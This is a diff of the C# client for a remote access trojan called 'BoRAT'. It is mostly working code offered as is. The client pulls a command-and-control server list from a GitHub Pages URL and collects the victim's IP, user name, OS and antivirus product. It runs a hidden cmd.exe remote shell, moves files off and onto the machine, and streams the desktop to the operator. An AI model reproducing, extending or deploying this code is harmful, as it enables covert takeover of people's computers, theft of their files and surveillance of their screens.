@@ -17,38 +17,41 @@ namespace BoRAT.Client
 {
     public partial class frmMain : Form
     {
+        /*
+         * Change this!!!
+         */
+
+        private readonly string serverList = "https://borat-admin.github.io/site/serverList.txt";
+
+        // Internal sockets
         private IPAddress _ip;
         private int _port, _delay;
 
         private Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
-
-        //FileManager
+        // Remote File Manager
+        private bool isFileUpload { get; set; }
         private int fupSize;
         private string fdl_location = "";
         private string fup_location = "";
         private byte[] receivedFile = new byte[1];
         private int writeSize;
 
-        private bool isFileUpload { get; set; }
-
-        //Cmd Shell
+        // Remote Shell
         private bool isStarted;
         private StreamReader readOuput, errorOutput;
-
-        private readonly string serverList = "https://borat-admin.github.io/site/serverList.txt";
         private StreamWriter writeInput;
+
+        // Remote Desktop
+        private bool isRdpStop { get; set; }
 
         public frmMain()
         {
             InitializeComponent();
-            GetConnectionIPs();
+            GetConnectionInfo();
         }
 
-        //Rdp
-        private bool isRdpStop { get; set; }
-
-        private void GetConnectionIPs()
+        private void GetConnectionInfo()
         {
             try
             {
@@ -79,336 +82,407 @@ namespace BoRAT.Client
 
         private void StartConnection()
         {
-            while (true)
-                if (clientSocket.Connected)
-                {
-                    Console.WriteLine("Connected to " + _ip + " on port " + _port);
-                    ReceiveInfo();
-                }
-                else
-                {
-                    MakeConnection();
-                }
+            try
+            {
+                while (true)
+                    if (clientSocket.Connected)
+                    {
+                        Console.WriteLine("Connected to " + _ip + " on port " + _port);
+                        ReceiveInfo();
+                    }
+                    else
+                    {
+                        MakeConnection();
+                    }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("INTERNAL ERROR:\n" + ex);
+            }
         }
 
         private void ReceiveInfo()
         {
-            var buffer = new byte[1024];
-            var received = 0;
-
             try
             {
-                received = clientSocket.Receive(buffer);
+                var buffer = new byte[1024];
+                var received = 0;
+
+                try
+                {
+                    received = clientSocket.Receive(buffer);
+                }
+                catch (SocketException)
+                {
+                    clientSocket.Close();
+                    clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                    MakeConnection();
+                }
+
+                if (received == 0)
+                    return;
+
+                var data = new byte[received];
+                Array.Copy(buffer, data, received);
+
+                if (isFileUpload) ProcessUploadRequest(data);
+
+                if (!isFileUpload)
+                    ProcessNormalRequest(data);
             }
-            catch (SocketException)
+            catch (Exception ex)
             {
-                clientSocket.Close();
-                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                MakeConnection();
+                Console.WriteLine("INTERNAL ERROR:\n" + ex);
             }
-
-            if (received == 0)
-                return;
-
-            var data = new byte[received];
-            Array.Copy(buffer, data, received);
-
-            if (isFileUpload) ProcessUploadRequest(data);
-
-            if (!isFileUpload)
-                ProcessNormalRequest(data);
         }
 
         private void MakeConnection()
         {
-            while (!clientSocket.Connected)
+            try
             {
-                try
-                {
-                    clientSocket.Connect(Dns.GetHostAddresses(Convert.ToString(_ip)), _port);
+                while (!clientSocket.Connected)
+                    try
+                    {
+                        clientSocket.Connect(Dns.GetHostAddresses(Convert.ToString(_ip)), _port);
 
-                    Thread.Sleep(_delay);
-                }
-                catch (SocketException)
-                {
-                    // Run just in case IPs change
-                    GetConnectionIPs();
-                }
-
-                ;
+                        Thread.Sleep(_delay);
+                    }
+                    catch (SocketException)
+                    {
+                        // Run just in case IPs change
+                        GetConnectionInfo();
+                    }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("INTERNAL ERROR:\n" + ex);
             }
         }
 
         private string GetPublicIPAddress()
         {
-            var pubIP = new WebClient().DownloadString("https://api.ipify.org");
-            return pubIP;
+            try
+            {
+                var pubIP = new WebClient().DownloadString("https://api.ipify.org");
+                return pubIP;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("INTERNAL ERROR:\n" + ex);
+                return "N/A";
+            }
         }
 
         private string GetUserName()
         {
-            var machinName = Environment.UserName;
-            return machinName;
+            try
+            {
+                var userName = Environment.UserName;
+                return userName;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("INTERNAL ERROR:\n" + ex);
+                return "N/A";
+            }
         }
 
         private string GetOSName()
         {
-            string osName;
-            var key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
-            osName = (string)key.GetValue("productName");
-            return osName;
+            try
+            {
+                string osName;
+                var key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
+                osName = (string)key.GetValue("productName");
+                return osName;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("INTERNAL ERROR:\n" + ex);
+                return "N/A";
+            }
         }
 
         private string GetSecurityName()
         {
-            var avName = "";
             try
             {
-                var windowsDefender = false;
-                var wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
-                var searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
-                var instances = searcher.Get();
-                avName = "";
-                foreach (var instance in instances)
+                var avName = "";
+                try
                 {
-                    if (instance.GetPropertyValue("displayName").ToString().Equals("Windows Defender"))
-                        windowsDefender = true;
-                    if (instance.GetPropertyValue("displayName").ToString() != "Windows Defender")
-                        avName = instance.GetPropertyValue("displayName").ToString();
+                    var windowsDefender = false;
+                    var wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
+                    var searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
+                    var instances = searcher.Get();
+                    avName = "";
+                    foreach (var instance in instances)
+                    {
+                        if (instance.GetPropertyValue("displayName").ToString().Equals("Windows Defender"))
+                            windowsDefender = true;
+                        if (instance.GetPropertyValue("displayName").ToString() != "Windows Defender")
+                            avName = instance.GetPropertyValue("displayName").ToString();
+                    }
+
+                    if (avName.Equals(string.Empty) && windowsDefender)
+                        avName = "Windows Defender";
+                    if (avName == "") avName = "N/A";
+                }
+                catch (Exception)
+                {
+                    avName = "N/A";
                 }
 
-                if (avName.Equals(string.Empty) && windowsDefender)
-                    avName = "Windows Defender";
-                if (avName == "") avName = "N/A";
+                return avName;
             }
-            catch (Exception)
+            catch (Exception ex)
             {
-                avName = "N/A";
+                Console.WriteLine("INTERNAL ERROR:\n" + ex);
+                return "N/A";
             }
-
-            return avName;
         }
 
         private string GetTimeDate()
         {
-            var TimeDate = DateTime.Now.ToString();
-            return TimeDate;
+            try
+            {
+                var TimeDate = DateTime.Now.ToString();
+                return TimeDate;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("INTERNAL ERROR:\n" + ex);
+                return "N/A";
+            }
         }
 
         private void ProcessNormalRequest(byte[] data)
         {
-            var cmd = Encoding.Unicode.GetString(data);
-            cmd = Decrypt(cmd);
-            if (cmd.Contains("getInfo"))
+            try
             {
-                var id = cmd.Split('~')[1];
-                string information, pubIp, userName, osName, avName, timeDate;
-                pubIp = GetPublicIPAddress();
-                userName = GetUserName();
-                osName = GetOSName();
-                avName = GetSecurityName();
-                timeDate = GetTimeDate();
-
-                information = id + "~" + pubIp + "~" + userName +
-                              "~" + osName + "~" + avName + "~" +
-                              timeDate;
-                var sendInfo = "infoBack|" + information;
-
-                SendCommand(sendInfo);
-            }
-
-            else if (cmd.Equals("startCmd"))
-            {
-                isStarted = true;
-
-                var pInfo = new ProcessStartInfo();
-                pInfo.FileName = "cmd.exe";
-                pInfo.CreateNoWindow = true;
-                pInfo.UseShellExecute = false;
-                pInfo.RedirectStandardInput = true;
-                pInfo.RedirectStandardOutput = true;
-                pInfo.RedirectStandardError = true;
-
-                var p = new Process();
-                p.StartInfo = pInfo;
-                p.Start();
-                writeInput = p.StandardInput;
-                readOuput = p.StandardOutput;
-                errorOutput = p.StandardError;
-                writeInput.AutoFlush = true;
-
-                var cmdShellThread = new Thread(RunCmdShellCommands);
-                cmdShellThread.Start();
-            }
-
-            else if (cmd.StartsWith("cmd§"))
-            {
-                if (isStarted)
+                var cmd = Encoding.Unicode.GetString(data);
+                cmd = Decrypt(cmd);
+                if (cmd.Contains("getInfo"))
                 {
-                    var strCmd = cmd.Split('§')[1];
-                    writeInput.WriteLine(strCmd + "\r\n");
+                    var id = cmd.Split('~')[1];
+                    string information, pubIp, userName, osName, avName, timeDate;
+                    pubIp = GetPublicIPAddress();
+                    userName = GetUserName();
+                    osName = GetOSName();
+                    avName = GetSecurityName();
+                    timeDate = GetTimeDate();
+
+                    information = id + "~" + pubIp + "~" + userName +
+                                  "~" + osName + "~" + avName + "~" +
+                                  timeDate;
+                    var sendInfo = "infoBack|" + information;
+
+                    SendCommand(sendInfo);
                 }
 
-                else
+                else if (cmd.Equals("startCmd"))
                 {
-                    SendError("cmdFaild\n");
+                    isStarted = true;
+
+                    var pInfo = new ProcessStartInfo();
+                    pInfo.FileName = "cmd.exe";
+                    pInfo.CreateNoWindow = true;
+                    pInfo.UseShellExecute = false;
+                    pInfo.RedirectStandardInput = true;
+                    pInfo.RedirectStandardOutput = true;
+                    pInfo.RedirectStandardError = true;
+
+                    var p = new Process();
+                    p.StartInfo = pInfo;
+                    p.Start();
+                    writeInput = p.StandardInput;
+                    readOuput = p.StandardOutput;
+                    errorOutput = p.StandardError;
+                    writeInput.AutoFlush = true;
+
+                    var cmdShellThread = new Thread(RunCmdShellCommands);
+                    cmdShellThread.Start();
                 }
-            }
 
-            else if (cmd.Equals("drivesList"))
-            {
-                var dataToSend = "drivesList~";
-                var drivers = DriveInfo.GetDrives();
+                else if (cmd.StartsWith("cmd§"))
+                {
+                    if (isStarted)
+                    {
+                        var strCmd = cmd.Split('§')[1];
+                        writeInput.WriteLine(strCmd + "\r\n");
+                    }
 
-                foreach (var d in drivers)
+                    else
+                    {
+                        SendError("cmdFaild\n");
+                    }
+                }
+
+                else if (cmd.Equals("drivesList"))
+                {
+                    var dataToSend = "drivesList~";
+                    var drivers = DriveInfo.GetDrives();
+
+                    foreach (var d in drivers)
+                        try
+                        {
+                            if (d.IsReady)
+                                dataToSend += d.Name + "|" + d.TotalSize + "\n";
+                            else
+                                dataToSend += d.Name + "\n";
+                        }
+
+                        catch (UnauthorizedAccessException ex)
+                        {
+                            SendError("FileManager Error!\n" + ex.Message);
+                        }
+
+                        catch (IOException ex)
+                        {
+                            SendError("FileManager Error!\n" + ex.Message);
+                        }
+
+                    SendCommand(dataToSend);
+                }
+
+                else if (cmd.StartsWith("enterPath~"))
+                {
+                    var checkPath = false;
+                    var path = cmd.Split('~')[1];
+
+                    if (path.Length == 3 && path.Contains(":\\"))
+                    {
+                        checkPath = true;
+                    }
+                    else if (!checkPath && Directory.Exists(path))
+                    {
+                        checkPath = true;
+                    }
+                    else
+                    {
+                        SendError("Directory Not Found\n");
+                        return;
+                    }
+
+                    var enterDir = new Thread(() => FM_EnterDirectory(path));
+                    enterDir.Start();
+                }
+
+                else if (cmd.StartsWith("backPath~"))
+                {
+                    var path = cmd.Split('~')[1];
+
+                    if (path.Length == 3 && path.Contains(":\\"))
+                    {
+                        SendCommand("backPath~driveList");
+                    }
+                    else
+                    {
+                        path = new DirectoryInfo(path).Parent.FullName;
+                        SendCommand("backPath~" + path);
+                    }
+                }
+
+                else if (cmd.StartsWith("fdl~"))
+                {
+                    var info = cmd.Split('~')[1];
+                    if (File.Exists(info))
+                    {
+                        fdl_location = info;
+                        try
+                        {
+                            var size = new FileInfo(info).Length.ToString();
+                            SendCommand("fInfo~" + size);
+                        }
+                        catch (Exception ex)
+                        {
+                            SendError("Access Error!.\n" + ex.Message + "\n");
+                        }
+                    }
+                    else
+                    {
+                        SendError("File Not Found\n");
+                    }
+                }
+
+                else if (cmd.Equals("fdlConfirm"))
+                {
                     try
                     {
-                        if (d.IsReady)
-                            dataToSend += d.Name + "|" + d.TotalSize + "\n";
-                        else
-                            dataToSend += d.Name + "\n";
-                    }
-
-                    catch (UnauthorizedAccessException ex)
-                    {
-                        SendError("FileManager Error!\n" + ex.Message);
-                    }
-
-                    catch (IOException ex)
-                    {
-                        SendError("FileManager Error!\n" + ex.Message);
-                    }
-
-                SendCommand(dataToSend);
-            }
-
-            else if (cmd.StartsWith("enterPath~"))
-            {
-                var checkPath = false;
-                var path = cmd.Split('~')[1];
-
-                if (path.Length == 3 && path.Contains(":\\"))
-                {
-                    checkPath = true;
-                }
-                else if (!checkPath && Directory.Exists(path))
-                {
-                    checkPath = true;
-                }
-                else
-                {
-                    SendError("Directory Not Found\n");
-                    return;
-                }
-
-                var enterDir = new Thread(() => FM_EnterDirectory(path));
-                enterDir.Start();
-            }
-
-            else if (cmd.StartsWith("backPath~"))
-            {
-                var path = cmd.Split('~')[1];
-
-                if (path.Length == 3 && path.Contains(":\\"))
-                {
-                    SendCommand("backPath~driveList");
-                }
-                else
-                {
-                    path = new DirectoryInfo(path).Parent.FullName;
-                    SendCommand("backPath~" + path);
-                }
-            }
-
-            else if (cmd.StartsWith("fdl~"))
-            {
-                var info = cmd.Split('~')[1];
-                if (File.Exists(info))
-                {
-                    fdl_location = info;
-                    try
-                    {
-                        var size = new FileInfo(info).Length.ToString();
-                        SendCommand("fInfo~" + size);
+                        var dataToSend = File.ReadAllBytes(fdl_location);
+                        SendFile(dataToSend);
                     }
                     catch (Exception ex)
                     {
                         SendError("Access Error!.\n" + ex.Message + "\n");
                     }
                 }
-                else
+
+                else if (cmd.StartsWith("fup~"))
                 {
-                    SendError("File Not Found\n");
+                    fup_location = cmd.Split('~')[1];
+                    if (!File.Exists(fup_location))
+                    {
+                        fupSize = int.Parse(cmd.Split('~')[2]);
+                        receivedFile = new byte[fupSize];
+                        SendCommand("fupConfirm");
+                        isFileUpload = true;
+                    }
+                    else
+                    {
+                        SendError("File Already Exists.");
+                    }
+                }
+
+                else if (cmd.Equals("rdpStart"))
+                {
+                    isRdpStop = false;
+                    var rdpThread = new Thread(StreamScreen);
+                    rdpThread.Start();
+                }
+
+                else if (cmd.Equals("rdpStop"))
+                {
+                    isRdpStop = true;
                 }
             }
-
-            else if (cmd.Equals("fdlConfirm"))
+            catch (Exception ex)
             {
-                try
-                {
-                    var dataToSend = File.ReadAllBytes(fdl_location);
-                    SendFile(dataToSend);
-                }
-                catch (Exception ex)
-                {
-                    SendError("Access Error!.\n" + ex.Message + "\n");
-                }
-            }
-
-            else if (cmd.StartsWith("fup~"))
-            {
-                fup_location = cmd.Split('~')[1];
-                if (!File.Exists(fup_location))
-                {
-                    fupSize = int.Parse(cmd.Split('~')[2]);
-                    receivedFile = new byte[fupSize];
-                    SendCommand("fupConfirm");
-                    isFileUpload = true;
-                }
-                else
-                {
-                    SendError("File Already Exists.");
-                }
-            }
-
-            else if (cmd.Equals("rdpStart"))
-            {
-                isRdpStop = false;
-                var rdpThread = new Thread(StreamScreen);
-                rdpThread.Start();
-            }
-
-            else if (cmd.Equals("rdpStop"))
-            {
-                isRdpStop = true;
+                Console.WriteLine("INTERNAL ERROR:\n" + ex);
             }
         }
 
         private void ProcessUploadRequest(byte[] data)
         {
-            Buffer.BlockCopy(data, 0, receivedFile, writeSize, data.Length);
-
-            writeSize += data.Length;
-
-            if (receivedFile.Length == fupSize)
+            try
             {
-                try
+                Buffer.BlockCopy(data, 0, receivedFile, writeSize, data.Length);
+
+                writeSize += data.Length;
+
+                if (receivedFile.Length == fupSize)
                 {
-                    using (var fs = File.Create(fup_location))
+                    try
                     {
-                        var info = receivedFile;
-                        fs.Write(info, 0, info.Length);
+                        using (var fs = File.Create(fup_location))
+                        {
+                            var info = receivedFile;
+                            fs.Write(info, 0, info.Length);
+                        }
+
+                        Array.Clear(receivedFile, 0, receivedFile.Length);
+                    }
+                    catch (Exception ex)
+                    {
+                        SendError("File Upload Error!\n" + ex.Message + "\n");
                     }
 
-                    Array.Clear(receivedFile, 0, receivedFile.Length);
+                    SendCommand("fileReceived");
+                    isFileUpload = false;
                 }
-                catch (Exception ex)
-                {
-                    SendError("File Upload Error!\n" + ex.Message + "\n");
-                }
-
-                SendCommand("fileReceived");
-                isFileUpload = false;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("INTERNAL ERROR:\n" + ex);
             }
         }
 
@@ -559,18 +633,25 @@ namespace BoRAT.Client
             }
             catch (NotSupportedException)
             {
-                SendError("Unkown Error in EnterPath\n");
+                SendError("Unknown Error in EnterPath\n");
             }
         }
 
         private void StreamScreen()
         {
-            while (!isRdpStop)
+            try
             {
-                var imgConverter = new ImageConverter();
-                var image = (byte[])imgConverter.ConvertTo(DesktopScreen(), typeof(byte[]));
-                SendImage(image);
-                Thread.Sleep(1000);
+                while (!isRdpStop)
+                {
+                    var imgConverter = new ImageConverter();
+                    var image = (byte[])imgConverter.ConvertTo(DesktopScreen(), typeof(byte[]));
+                    SendImage(image);
+                    Thread.Sleep(1000);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("INTERNAL ERROR:\n" + ex);
             }
         }
 
